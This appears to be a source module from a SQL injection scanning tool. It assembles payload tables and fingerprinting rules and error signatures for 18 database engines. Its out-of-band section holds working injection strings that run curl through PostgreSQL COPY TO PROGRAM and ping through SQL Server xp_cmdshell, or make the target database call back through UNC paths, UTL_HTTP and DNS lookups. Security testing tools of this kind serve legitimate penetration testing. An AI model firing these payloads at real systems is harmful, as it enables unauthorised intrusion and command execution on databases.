// payloads 聚合入口：组装 PAYLOADS / CLAUSE_PAYLOADS + 全部跨库导出
// 从 payloads.js 拆分而来，保持所有 export 名称与对象结构不变。
// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符 {CALLBACK}=带外回调地址 {TOKEN}=子域标签 {DOMAIN}=DNS 回调域名

import { mysqlPayloads, mysqlClauses } from './mysql.js';
// [P0-FIX 2026-09-09] 时间向量夹顶需要可观察：被夹时必须留一条日志，否则使用者以为 --time-sec 生效了
import { logger } from '../../core/logger.js';
import { postgresPayloads, postgresClauses } from './postgres.js';
import { sqlserverPayloads, sqlserverClauses } from './sqlserver.js';
import { sqlitePayloads, sqliteClauses } from './sqlite.js';
import { oraclePayloads, oracleClauses } from './oracle.js';
import {
  clickhousePayload, db2Payload, sybasePayload, firebirdPayload,
  informixPayload, h2Payload, accessPayload, hsqldbPayload,
  derbyPayload, monetdbPayload,
} from './others.js';
// 高危（risk 3）payload 隔离池：默认不投放，需 enableDestructivePayloads() 显式开启。
// 详见 destructive.js 顶部说明（写文件 / RCE / 外连 / DoS 类向量的隔离原因）。
import {
  DESTRUCTIVE_PAYLOADS,
  DESTRUCTIVE_MIN_RISK,
  enableDestructivePayloads,
  getDestructiveTemplates,
} from './destructive.js';

// 全部受支持的检测技术枚举（与前端 src/shared/types.ts 的 TechniqueType 严格对应）
// 新增 'oob'（带外通道，无回显盲注兜底）；'inline'（对标 sqlmap Q 内联子查询，opt-in）；
// 默认 techniques（前端置空→全部）不含 oob/stacked/inline（均 opt-in）。
export const TECHNIQUE_TYPES = ['union', 'error', 'boolean', 'time', 'stacked', 'oob', 'second_order', 'inline'];

// ==================== PAYLOADS 装配 ====================
// 对象字面量顺序保持与原 payloads.js 一致：MySQL / PostgreSQL / SQL Server / SQLite / Oracle
// 后续通过赋值追加 MariaDB / TiDB / DM8（深拷贝克隆）与 ClickHouse..MonetDB（10 库）。
// 固定索引约束：boolean 数组 [0,2]/[1,3]/[4,5]/[6,7] 不可移动（BooleanBlindDetector 依赖）。
export const PAYLOADS = {
  MySQL: mysqlPayloads,
  PostgreSQL: postgresPayloads,
  'SQL Server': sqlserverPayloads,
  SQLite: sqlitePayloads,
  Oracle: oraclePayloads,
};

// MariaDB 复用 MySQL 全部模板（协议互通，仅指纹层用版本串 'MariaDB' 关键字区分并独立上报）
PAYLOADS.MariaDB = JSON.parse(JSON.stringify(PAYLOADS.MySQL));

// TiDB 复用 MySQL 全部模板（TiDB 100% 兼容 MySQL 协议与语法，仅指纹层用版本串 'TiDB' 关键字区分）
PAYLOADS.TiDB = JSON.parse(JSON.stringify(PAYLOADS.MySQL));

// DM8（达梦数据库）：Oracle 兼容模式，复用 Oracle 全部模板（UNION/报错/布尔/时间语法互通）。
// 仅指纹层用达梦专属标识（v$version 含 "DM Database" / "DM8"）独立区分并独立上报。
PAYLOADS.DM8 = JSON.parse(JSON.stringify(PAYLOADS.Oracle));

// ClickHouse：列式分析型数据库，自有 SQL 方言（非标准 SLEEP / 用 if() 构造布尔/时间）。
// 仅提供检测 payload（union/error/boolean/time），利用/提取路径标注受限（见 Exploiter/Extractor 映射）。
PAYLOADS.ClickHouse = clickhousePayload;

// —— C 方向新增（最小适配：union/error/boolean 基础；time/stacked 仅 Sybase 支持）——
// 方言 payload 未经真实环境验证，标注待验证。
PAYLOADS.DB2 = db2Payload;
PAYLOADS.Sybase = sybasePayload;
PAYLOADS.Firebird = firebirdPayload;
PAYLOADS.Informix = informixPayload;
PAYLOADS.H2 = h2Payload;

// —— D 方向新增（最小适配：union/error/boolean 基础；time/stacked 均不支持）——
// 方言 payload 未经真实环境验证，标注待验证。
PAYLOADS.Access = accessPayload;
PAYLOADS.HSQLDB = hsqldbPayload;
PAYLOADS.Derby = derbyPayload;
PAYLOADS.MonetDB = monetdbPayload;

// ==================== CLAUSE_PAYLOADS 装配 ====================
// 背景：主模板均假设注入点在 WHERE 值位置；ORDER BY / GROUP BY / HAVING / LIMIT 位置的注入点
// 无法用「AND 1=1」类谓词追加，需子句专属语法（逗号拼接标量子查询 / HAVING 追加 / PROCEDURE ANALYSE 等）。
// 结构：{ [dbms]: { [clause]: { boolean: [[真模板, 假模板], ...], error: [模板...], time: [模板...] } } }
//   clause ∈ where（值位置括号闭合补充变体）/ orderby / groupby / having / limit；
//   clause 顺序即消费优先级（子句专属变体在前，where 补充变体在后），检测器按 level>=2 有界投放。
// 有界约定：每库每 clause 每技术 ≤ 3 条（getClauseTemplates/getClausePairs 再做总量截断）。
// 判定语义：boolean 对的「假模板」多为触发数据库报错/空结果的向量（如多行子查询报错），真≈基线、假≠基线即注入。
export const CLAUSE_PAYLOADS = {
  MySQL: mysqlClauses,
  PostgreSQL: postgresClauses,
  'SQL Server': sqlserverClauses,
  Oracle: oracleClauses,
  SQLite: sqliteClauses,
};

// MariaDB / TiDB 复用 MySQL 子句模板（协议互通，与 PAYLOADS 克隆策略一致）
CLAUSE_PAYLOADS.MariaDB = CLAUSE_PAYLOADS.MySQL;
CLAUSE_PAYLOADS.TiDB = CLAUSE_PAYLOADS.MySQL;
// DM8 复用 Oracle 子句模板（Oracle 兼容模式）
CLAUSE_PAYLOADS.DM8 = CLAUSE_PAYLOADS.Oracle;

// ==================== OOB 带外触发语句（技术名 'oob'，无回显盲注兜底） ====================
// 占位符：{ORIG}=原始值；{CALLBACK}=拼接后的带外回调地址（callbackBase/oob/:token）。
// 由各库触发 DBMS 主动回连（MySQL LOAD_FILE/UNC、PostgreSQL COPY PROGRAM、
// SQL Server xp_dirtree、Oracle UTL_HTTP 等），目标回连即确认注入。
// 注：SQLite 无原生带外能力，留空不投放。
export const OOB_PAYLOADS = {
  MySQL: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  MariaDB: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  PostgreSQL: [
    "{ORIG}'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'-- -",
    "{ORIG}' AND 1=1; COPY (SELECT 1) TO PROGRAM 'nslookup {CALLBACK}'-- -",
  ],
  'SQL Server': [
    "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}'-- -",
    "{ORIG}'; EXEC master..xp_cmdshell 'ping -n 1 {CALLBACK}'-- -",
  ],
  Oracle: [
    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('{CALLBACK}') FROM dual-- -",
    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
  ],
  SQLite: [], // SQLite 无原生带外能力，不投放 OOB
  // TiDB：MySQL 协议兼容，复用 MySQL OOB 模板（UNC/LOAD_FILE 回连）
  TiDB: [
    "{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c, (SELECT '{CALLBACK}'), 0x5c78))-- -",
    "{ORIG}' AND (SELECT LOAD_FILE(CONCAT('//', '{CALLBACK}', '/x')))-- -",
  ],
  // DM8：Oracle 兼容模式，复用 Oracle OOB 模板（UTL_HTTP 回连，需对应权限）
  DM8: [
    "{ORIG}' AND 1=1; SELECT UTL_HTTP.REQUEST('{CALLBACK}') FROM dual-- -",
    "{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT '{CALLBACK}'))) IS NULL-- -",
  ],
  // ClickHouse：无原生带外能力（无 LOAD_FILE/UTL_HTTP/COPY PROGRAM 类原语），不投放 OOB
  ClickHouse: [],
};

// DNS OOB 触发模板（对标 sqlmap --dns-domain）：token 作为子域名标签，目标执行语句时发起
// 对 <token>.{DOMAIN} 的 DNS 查询，由 oobReceiver 的 UDP 监听捕获。适用于无 HTTP 出站、
// 仅 DNS 出站的目标（防火墙几乎不拦 DNS）。占位符：{ORIG} 原参数值 / {TOKEN} 唯一子域标签
// / {DOMAIN} DNS 回调域名。与 OOB_PAYLOADS 同理：DNS 轮【不做 tamper】（会破坏域名）。
export const DNS_OOB_PAYLOADS = {
  // UNC 路径触发解析（0x5c5c=\\ 0x5c78=\x，十六进制避转义；需 secure_file_priv 允许 UNC）
  MySQL: ["{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))-- -"],
  MariaDB: ["{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))-- -"],
  TiDB: ["{ORIG}' AND LOAD_FILE(CONCAT(0x5c5c,'{TOKEN}.{DOMAIN}',0x5c78))-- -"],
  // xp_dirtree 解析 UNC 主机名（需堆叠支持；xp_fileexist 同理不重复投放）
  'SQL Server': ["{ORIG}'; EXEC master..xp_dirtree '\\\\{TOKEN}.{DOMAIN}\\foo'-- -"],
  // UTL_INADDR 纯 DNS 原语（无需 HTTP 出站权限，仅需 resolve 权限）
  Oracle: ["{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{TOKEN}.{DOMAIN}')) IS NOT NULL-- -"],
  DM8: ["{ORIG}' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{TOKEN}.{DOMAIN}')) IS NOT NULL-- -"],
  // PG 无纯 DNS 原语：dblink 需扩展+连接串、COPY PROGRAM 'nslookup' 需超级用户且语法易碎，
  // 条件苛刻不投放（sqlmap 对 PG 的 DNS 外带同样受限）
  PostgreSQL: [],
  SQLite: [], // 无原生带外能力
  ClickHouse: [], // 无原生带外能力
};

// DBMS 指纹规则（按响应头特征识别）
// [OPT-FIX 2026-09-08] 移除语言级信号（php/phpsessid/asp.net/python）：X-Powered-By: PHP
// 只能证明应用是 PHP 写的，后端可以是任何数据库——Python sqli-labs（SQLite 靶场）回显
// X-Powered-By: PHP/7.4.33 → 此前第 2 步提前误判 MySQL，报错签名/时间向量定库（真实
// 方言证据）根本没机会执行 → L04/L14 漏检。数据库判定只保留 DB 特征（Server 头、
// 厂商标识、报错签名、UNION 版本回显）。
export const FINGERPRINT = {
  // MySQL：无可靠响应头特征（由 UNION 版本回显 / 报错签名 / 时间向量定库）
  MySQL: [],
  PostgreSQL: [{ header: 'X-Powered-By', match: /postgresql/i }],
  // SQL Server：asp.net 仅证明应用栈，不证明数据库（由报错签名/时间向量定库）
  'SQL Server': [],
  SQLite: [],
  Oracle: [{ header: 'Server', match: /oracle/i }],
  // MariaDB：响应头带 mariadb 标识时独立识别
  MariaDB: [{ header: 'X-Powered-By', match: /mariadb/i }, { header: 'Server', match: /mariadb/i }],
  // TiDB：MySQL 协议兼容，版本串含 "TiDB" 标识（如 "5.7.25-TiDB-v7.x"），独立识别
  TiDB: [{ header: 'Server', match: /tidb/i }, { header: 'X-Powered-By', match: /tidb/i }],
  // DM8（达梦数据库）：Oracle 兼容模式，版本串含 "DM Database" / "DM8" 标识
  DM8: [{ header: 'Server', match: /(DM Database|DM8|Dameng)/i }, { header: 'X-Powered-By', match: /dameng/i }],
  // ClickHouse：响应头/版本串含 clickhouse 标识
  ClickHouse: [{ header: 'Server', match: /clickhouse/i }, { header: 'X-ClickHouse-Summary', match: /./ }],
  // —— C 方向新增（最小适配，响应头特征，待真实环境验证）——
  // [todo#39 2026-09-11] 词边界加固：裸子串签名会误命中无关响应头——实测 Python 靶场
  // `Server: BaseHTTP/0.6 Python/3.x` 的 "BaseHTTP" 含子串 "ase" → Sybase 的 /ASE/i 误命中
  // → 25ms 内抢先定库 Sybase → payload 族错配 → sqli-labs L46 整关 0 检出。所有裸短签名
  // 加 \b 词边界（Adaptive Server/Sybase 等长短语本身无误命中风险，保持原样）。
  DB2: [{ header: 'Server', match: /\bdb2\b/i }],
  Sybase: [{ header: 'Server', match: /(Adaptive Server|Sybase|\bASE\b)/i }],
  Firebird: [{ header: 'Server', match: /\bfirebird\b/i }],
  Informix: [{ header: 'Server', match: /\binformix\b/i }],
  H2: [{ header: 'Server', match: /\bh2\b/i }, { header: 'X-Powered-By', match: /\bh2\b/i }],
  // —— D 方向新增（最小适配，响应头特征，待真实环境验证）——
  Access: [{ header: 'X-Powered-By', match: /\basp\b/i }],
  HSQLDB: [{ header: 'Server', match: /\bhsqldb\b/i }],
  Derby: [{ header: 'Server', match: /(\bderby\b|\bjava\b)/i }],
  MonetDB: [{ header: 'Server', match: /monetdb/i }],
};

// UNION 指纹用的版本表达式 + 响应中可识别的版本特征（供 DBFingerprinter 判定 dbms）。
// 与 FINGERPRINT（响应头特征）互补：头特征命中则直接定库，否则走 UNION 版本回显判定。
export const DB_VERSION = {
  // MariaDB 置于 MySQL 之前：优先命中（与 DBFingerprinter 遍历顺序配合区分）
  MariaDB: { func: 'version()', sig: /MariaDB/i },
  // [EXCL-FIX 2026-09-19] H2 提到 MySQL 之前，并把探测函数换成 H2 **独有**的 H2VERSION()。
  // 真引擎 A/B（e2e/multi-engine-lab，H2 2.2.224 经 JDBC 内存库，NO_WAF 以放行 UNION 探针）：
  //   · 修复前（H2 在末尾 + `version()`）：18 条探针全部 echo=N → **定库失败 dbms=null**。
  //     实测落空点：MySQL/MariaDB/PG/TiDB/ClickHouse 都走 `version()`，而 MySQL 系 WRAP 的
  //     `CAST(x AS CHAR)` 在 H2 上直接报错 → 整行无标记回显，H2 那条排在末尾也轮不到。
  //   · 修复后：`verFp H2 echo=Y 取到值="2.2.224" sig命中=true` → dbms=H2。
  //     （同台上 HSQLDB/Derby 仍 18/18 echo=N → dbms=null，那是它们自己的 WRAP/伪表问题，另记 TODO。）
  // 顺序前置是**预防性**的：H2 的 sig 是裸版本号，若某台 H2（1.x 或 MODE=MySQL 兼容更完整时）
  // 的 version() 能在 MySQL 系 wrap 下回显，MySQL 会先抢走 → payload 族/注释符/提取语句整套错配。
  // 本机未实测到这条，但它与「MariaDB 必须排在 MySQL 前」是同一个机理，成本为零。
  // 换 exclusive 函数才是把判据从「sig 能不能区分」换成「**这个表达式只在它自己的库上能跑出结果**」。
  H2: { func: 'H2VERSION()', sig: /^\d+\.\d+/ },
  // MySQL 负向约束：版本串若含 MariaDB 则判为 MariaDB（不让 MySQL 抢匹配）
  MySQL: { func: 'version()', sig: /^\d+\.\d+\.\d+(?!.*MariaDB).*$/i },
  PostgreSQL: { func: 'version()', sig: /PostgreSQL\s+\d+/i },
  'SQL Server': { func: '@@version', sig: /(Microsoft SQL Server|SQL Server|Microsoft SQL)/i },
  SQLite: { func: 'sqlite_version()', sig: /^\d+\.\d+\.\d+$/ },
  Oracle: { func: '(SELECT banner FROM v$version WHERE rownum=1)', sig: /(Oracle|Release\s+\d+\.\d+)/i },
  // TiDB：MySQL 协议兼容，版本串形如 "5.7.25-TiDB-v7.5.0"（func 用 MySQL 的 version()）
  TiDB: { func: 'version()', sig: /TiDB/i },
  // DM8：Oracle 兼容，v$version 报 "DM Database Server Version..." 或含 "DM8"
  DM8: { func: '(SELECT banner FROM v$version WHERE rownum=1)', sig: /(DM Database|DM8|Dameng)/i },
  // ClickHouse：version() 返回 "23.8.1.1" 等纯数字串，加 CH 专属回显特征避免与 SQLite 误判
  ClickHouse: { func: 'version()', sig: /^\d+\.\d+\.\d+(\.\d+)?$/ },
  // —— C 方向新增（最小适配，func 用常量串/版本函数 + sig 标识，待真实环境验证）——
  // [P1-FIX 2026-09-16] DB2：原 sig=/DB2/i 会命中常量串本身 —— 任何支持 UNION 的库都能
  // 执行 SELECT 'DB2' 并原样返回，于是「前 9 个库都没识别出来」的目标必然被判 DB2
  // （blackbox-lab 实测：真 MySQL 8.0.28 被判 DB2）。现要求真实引擎特征文本；
  // DB2 定库改由报错签名（DB2 SQL Error / SQLSTATE）与专属伪表承担。
  DB2: { func: "'DB2'", sig: /IBM\s+DB2|DB2\s+(?:SQL|Database|for\s)|DB2\/[A-Za-z0-9]/i },
  // Sybase（ASE）：@@version 含 "Adaptive Server Enterprise" 标识
  Sybase: { func: '@@version', sig: /(Adaptive Server|Sybase|ASE)/i },
  // Firebird：rdb$get_context 返回引擎版本（数字串）
  Firebird: { func: "rdb$get_context('SYSTEM','ENGINE_VERSION')", sig: /^\d+\.\d+/ },
  // [P1-FIX 2026-09-16] Informix：同上 —— 常量串无区分度，收紧为需版本/产品特征文本
  Informix: { func: "'Informix'", sig: /Informix\s+(?:Dynamic|Server|IDS|Version)|IBM\s+Informix/i },
  // H2 已上移到 MariaDB 之后、MySQL 之前并改用 H2VERSION()，见上方 EXCL-FIX。
  // —— D 方向新增（最小适配，待真实环境验证）——
  // [P1-FIX 2026-09-16] Access：同上
  Access: { func: "'ACCESS'", sig: /Microsoft\s+(?:Office\s+)?Access|Access\s+Database\s+Engine/i },
  // [EXCL-FIX 2026-09-20] HSQLDB / Derby 的原 func 是**裸常量串**（`'HSQLDB'` / `'DERBY'`），
  // 而 09-16 那次为堵 DB2 误判把 sig 收紧成了 `HSQLDB\s+\d` / `Apache\s+Derby|Derby\s+\d`——
  // 于是这两条探针**回显了自己也永远匹配不上自己的 sig**：常量串里没有数字、没有厂商前缀。
  // 定库恒 null 不是"探针跑不动"，是判据写死了不可满足。多引擎靶场开 NO_WAF 实测确认：
  // 技术位 3/3 全检出（说明 UNION 通道通、回显在），定库却仍是 null。
  //
  // 换成 exclusive 表达式：区分力来自 **FROM 子句只在自家库存在**（不是来自字面量），
  // 所以正面回应了 DB2 那次的教训——别家库执行它直接报错 → 无回显 → 不可能误判。
  //
  // 但这需要探针**带自己的 FROM**，而版本回显通道的列表达式是
  // `UNION SELECT NULL, WRAP(func), NULL <fromDummy>` —— func 只能是标量表达式。
  // 实测 HSQLDB 直接拒绝"CAST 里放子查询"（`unexpected token`），所以把 FROM 做成
  // DB_VERSION 条目的可选字段 `from`：只在声明了它的条目上生效，其余 16 个库的
  // 探针构造一字不变（blast radius 收到最小）。
  // 真引擎实测（e2e/multi-engine-lab NO_WAF=1，HSQLDB 2.7.3 / Derby 10.16.1.1）：
  //   hsqldb → "HSQLDB 103"；同一条放 H2 报 Table "system_tables" not found、放 Derby 报 Schema 不存在
  //   derby  → "DERBY 24" ；Derby 不做 INTEGER→VARCHAR 隐式转换，且 CAST(.. AS VARCHAR) 反而报
  //            Cannot convert types —— 只有 CAST(.. AS CHAR(n)) 通（实测踩过）
  // COUNT(*) 给的数字正好喂给 sig 里那个 `\d`。
  HSQLDB: {
    func: "'HSQLDB ' || COUNT(*)",
    from: 'FROM INFORMATION_SCHEMA.SYSTEM_TABLES',
    sig: /HSQLDB\s+\d|HyperSQL|org\.hsqldb/i,
  },
  Derby: {
    func: "'DERBY ' || CAST(COUNT(*) AS CHAR(10))",
    from: 'FROM SYS.SYSTABLES',
    sig: /Apache\s+Derby|Derby\s+\d|org\.apache\.derby/i,
  },
  // MonetDB：用 sys.version 视图回显版本号
  MonetDB: { func: '(SELECT sys_version FROM sys.version)', sig: /^\d+\.\d+/ },
};

export const DBMS_LIST = ['MySQL', 'PostgreSQL', 'SQL Server', 'SQLite', 'Oracle', 'MariaDB', 'TiDB', 'DM8', 'ClickHouse', 'DB2', 'Sybase', 'Firebird', 'Informix', 'H2', 'Access', 'HSQLDB', 'Derby', 'MonetDB'];

// DBMS 验证状态标注（诚实标注：4 真实验证 + 14 最小适配待验证）
// 真实验证：经过真实 DBMS 引擎的靶场场景验证
// 最小适配：有 payload 模板但未经真实 DBMS 验证，方言可能有偏差
export const DBMS_VERIFIED = {
  MySQL: 'verified',        // 真实 MySQL 8.0.28（e2e/real-mysql-lab 9/9：union/error/boolean/time/stacked 全通道 + 安全点零误报）
  PostgreSQL: 'verified',   // PGlite WASM 真实验证（PG 18.3，e2e/real-world-lab 9/9）
  SQLite: 'verified',       // sql.js WASM 真实验证
  MariaDB: 'verified',      // MariaDB 便携真实验证
  'SQL Server': 'unverified', // 有模板，无真实 MSSQL 验证
  Oracle: 'unverified',     // 有模板，无真实 Oracle 验证
  TiDB: 'unverified',       // 复用 MySQL 模板，无真实 TiDB 验证
  DM8: 'unverified',        // 复用 Oracle 模板，无真实 DM8 验证
  ClickHouse: 'unverified',
  DB2: 'unverified',
  Sybase: 'unverified',
  Firebird: 'unverified',
  Informix: 'unverified',
  H2: 'unverified',
  Access: 'unverified',
  HSQLDB: 'unverified',
  Derby: 'unverified',
  MonetDB: 'unverified',
};

// 各 DBMS 支持的技术（Oracle 不支持时间盲注，故 time=false）
// oob：带外通道支持标记（MySQL/MariaDB/PostgreSQL/SQL Server/Oracle 支持，SQLite 无原生带外故 false）
// 注：DB2/Sybase/Firebird/Informix/H2 为 C 方向新增最小适配（检测+识别+基础提取），
//     利用深度（OS 接管/文件读写）本版未实现，TAKEOVER_CAPS 中诚实标 false；方言 payload 未经真实环境验证，标注待验证。
export const SUPPORTED = {
  MySQL: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
  MariaDB: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
  PostgreSQL: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
  'SQL Server': { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
  SQLite: { union: true, error: true, boolean: true, time: true, stacked: true, oob: false, second_order: true },
  Oracle: { union: true, error: true, boolean: true, time: true, stacked: false, oob: true, second_order: true },
  // TiDB：MySQL 协议兼容，能力与 MySQL 一致
  TiDB: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
  // DM8：Oracle 兼容模式，能力与 Oracle 一致（OOB 经 UTL_HTTP 等，需对应权限）
  DM8: { union: true, error: true, boolean: true, time: true, stacked: true, oob: true, second_order: true },
  // ClickHouse：支持 union/error/boolean/time；不支持堆叠（单语句），OOB 无原生带外能力
  ClickHouse: { union: true, error: true, boolean: true, time: true, stacked: false, oob: false, second_order: true },
  // —— C 方向新增（最小适配，方言 payload 待真实环境验证）——
  DB2: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
  Sybase: { union: true, error: true, boolean: true, time: true, stacked: true, oob: false, second_order: true },
  Firebird: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
  Informix: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
  H2: { union: true, error: true, boolean: true, time: true, oob: false, second_order: true },
  // —— D 方向新增（最小适配，待真实环境验证）——
  Access: { union: true, error: false, boolean: true, time: false, oob: false, second_order: true },
  HSQLDB: { union: true, error: true, boolean: true, time: false, oob: false, second_order: true },
  Derby: { union: true, error: false, boolean: true, time: false, oob: false, second_order: true },
  MonetDB: { union: true, error: true, boolean: true, time: true, oob: false, second_order: true },
};

// 报错特征正则（跨库常见报错关键字）：提升为共享常量，
// 供 ErrorDetector 与 SecondOrderDetector 触发页判定复用（避免重复定义）。
// [P0-FIX 2026-09-10 实测] 收紧「裸库名」签名：原正则含裸词 H2 / Derby / Sybase / Firebird /
// Informix / MonetDB / HSQLDB / JDBC，大小写不敏感 → 普通 HTML 页面里的 <h2> 标题、
// "Derby" 之类的正文用词都会被判成「数据库报错」。实测二阶注入因此完全失效：
// 触发页含 <h2> → 基线被误判「本就报错」→ 判定走「基线噪声路径」→ 该路径要求显式
// negativeControl 才下结论 → 默认直接漏检（E15 靶点 250 请求全空）；同时对含 h2 的
// 常规页面构成误报隐患。
// 处置：库名一律要求带错误上下文（驱动类名/异常名/报错短语）才算报错特征。
export const ERROR_SIG =
  /(SQL syntax|mysql_fetch|ORA-\d{5}|Microsoft SQL Server|PostgreSQL.*ERROR|SQLite3|syntax error|unterminated quoted string|Unclosed quotation|extractvalue|updatexml|conversion failed|unknown column|Division by zero|SQL\d{4}[NRT]|DB2 SQL Error|SQLSTATE|Adaptive Server|Sybase\s*(?:error|message)|SQL error code|Firebird.*(?:error|exception)|isc_\d+|Informix\s+SQL|Informix.*(?:error|exception)|JdbcSQLException|org\.h2\.jdbc|Syntax error in SQL statement|org\.hsqldb|HSQLDB.*(?:error|exception)|org\.apache\.derby|Derby.*SQLException|Syntax error: Encountered|Cannot parse|Microsoft Access|ODBC|Jet.*Database|MonetDB.*(?:error|exception)|MonetDB\s+\d{5})/i;

// per-dbms 报错签名表（P1-D3）：由 ERROR_SIG 拆分，用于「报错回显反推 DBMS」。
// 无回显/无响应头特征时，ErrorDetector 命中后按此表定库，避免 dbms 恒为 null。
// 顺序即优先级（MariaDB 置于 MySQL 前，与 DB_VERSION 负向排除一致）。
export const ERROR_SIG_BY_DBMS = [
  { dbms: 'MariaDB', sig: /(MariaDB)/i },
  // [⑯] 补全 TiDB/DM8 独立报错签名（置于 MySQL/Oracle 前，优先匹配兼容分支特征词）
  { dbms: 'TiDB', sig: /(TiDB)/i },
  { dbms: 'DM8', sig: /(DM8|达梦|Dameng)/i },
  // [P0-FIX 2026-09-06] PostgreSQL 前移 + 强特征前缀："syntax error at or near" 是 PG
  // 独有短语（MySQL 报错为 "You have an error in your SQL syntax"）。原顺序下 PG 报错
  // 会引用注入函数名（如 syntax error at or near "extractvalue"）→ 命中 MySQL 的
  // extractvalue 特征 → 真实 PG 靶场被整体误识别为 MySQL（real-world-lab 实测）。
  // [P1-FIX 2026-09-07] 补 "unterminated quoted string at or near"（PG 引号未闭合高频
  // 报错形态，此前仅收录 MSSQL 风格 "Unclosed quotation" → 二阶探针触发页报错漏识别）。
  { dbms: 'PostgreSQL', sig: /(PostgreSQL.*ERROR|psycopg|syntax error at or near|unterminated quoted string|PG::)/i },
  // MySQL 特征清理：移除 extractvalue/updatexml（它们会以注入函数名形式出现在其它库的
  // 报错里，属污染特征）；补 XPATH syntax（extractvalue 回显报错的真实形态）。
  { dbms: 'MySQL', sig: /(mysql_fetch|mysqli|You have an error in your SQL syntax|XPATH syntax|SQL syntax)/i },
  { dbms: 'SQL Server', sig: /(Microsoft SQL Server|SQL Server|Unclosed quotation mark|SQL\d{4}[NRT]|Incorrect syntax near|ODBC)/i },
  // [OPT-FIX 2026-09-08] 补 "unrecognized token"（SQLite Python sqlite3/驱动高频语法报错形态，
  // 如 unrecognized token: ""1"")"。此前该形态不命中任何签名 → 指纹 null → 时间向量逐库粗筛
  // 仍可能误判（Python sqli-labs L04/L14 实测漏检，强制 dbms=SQLite 即检出）。
  // 注意：正则锚定 "unrecognized token" 前缀——MySQL 报错也含 near 但不含该短语，无冲突。
  { dbms: 'SQLite', sig: /(SQLite3|unrecognized token|no such (table|column|function)|SQLite)/i },
  { dbms: 'Oracle', sig: /(ORA-\d{5}|Oracle|PLS-\d+)/i },
  { dbms: 'DB2', sig: /(DB2 SQL Error|SQLSTATE)/i },
  { dbms: 'Sybase', sig: /(Adaptive Server|Sybase|SQL error code)/i },
  { dbms: 'Firebird', sig: /(Firebird|isc_|Dynamic SQL Error)/i },
  { dbms: 'Informix', sig: /(Informix)/i },
  { dbms: 'H2', sig: /(org\.h2|H2)/i },
  { dbms: 'ClickHouse', sig: /(DB::Exception|ClickHouse)/i },
  { dbms: 'Access', sig: /(Microsoft Access|ODBC|Jet.*Database|Could not find file)/i },
  { dbms: 'HSQLDB', sig: /(HSQLDB|org\.hsqldb)/i },
  { dbms: 'Derby', sig: /(Derby|org\.apache\.derby)/i },
  { dbms: 'MonetDB', sig: /(MonetDB|monetdb|mclient)/i },
];

// 从报错文本反推 DBMS（P1-D3）：命中 per-dbms 签名返回库名，否则 null。
// [OPT-FIX 2026-09-08] 匹配前剥除 HTML 标签：H2 签名 `H2`（大小写不敏感）会把正常页的
// <h2> 标签误判为 H2 数据库证据（Python sqli-labs L04 实测：无报错正常页 → 误定库 H2 →
// payload 族错配 → 漏检）。含标签才剥（纯文本零开销），剥除后签名只匹配真实文本。
// [todo#38 2026-09-11] 裸库名命中护栏：剥标签防不住正文随机文本——强动态页（时间戳/广告位/
// 推荐流为随机 base36/hex 文本）可自然拼出 "h2"/"dm8" 子串，报错探针打到吞错页返回的正常页
// 上弱签名误命中 → 定库在 H2/DM8 间摇摆（/noisy 靶点实测）。处置：匹配结果恰好是裸库名
// （而非 org.h2.jdbc / ORA-00933 / SQL syntax 这类强特征短语）时，要求命中位置 ±160 字符
// 窗口内存在报错上下文关键词；强特征短语自带可信度直接放行（不影响真实报错页定库，零回归）。
const ERR_CONTEXT_RE = /(error|exception|syntax|warning|jdbc|sqlstate|stack\s*trace|错误|异常|失败|ORA-)/i;
const BARE_DB_NAME_RE = /^(h2|dm8|mariadb|tidb|mysql|oracle|derby|informix|monetdb|firebird|sybase|db2|access|clickhouse|postgresql|sqlite|sql server)$/i;
export function dbmsFromError(text) {
  let s = String(text ?? '');
  if (/<[a-z!/[ ]/i.test(s)) {
    s = s
      .replace(/<script[\s\S]*?<\/script>/gi, ' ')
      .replace(/<style[\s\S]*?<\/style>/gi, ' ')
      .replace(/<!--[\s\S]*?-->/g, ' ')
      .replace(/<[^>]*>/g, ' ');
  }
  for (const { dbms, sig } of ERROR_SIG_BY_DBMS) {
    const m = sig.exec(s);
    if (!m) continue;
    // 裸库名命中：须有报错上下文佐证（防随机文本误命中）；强特征短语直接放行
    if (BARE_DB_NAME_RE.test(String(m[0]).trim())) {
      const idx = m.index ?? 0;
      const win = s.slice(Math.max(0, idx - 160), Math.min(s.length, idx + m[0].length + 160));
      if (!ERR_CONTEXT_RE.test(win)) continue;
    }
    return dbms;
  }
  return null;
}

// 时间向量定库（P1-D3）：各库独有的延时原语（SLEEP/pg_sleep/WAITFOR DELAY/DBMS_PIPE/LIKE 重运算），
// dbms 未知时由 DBFingerprinter 按高频库顺序注入观测耗时辅助定库，命中（响应耗时超阈值）即停。
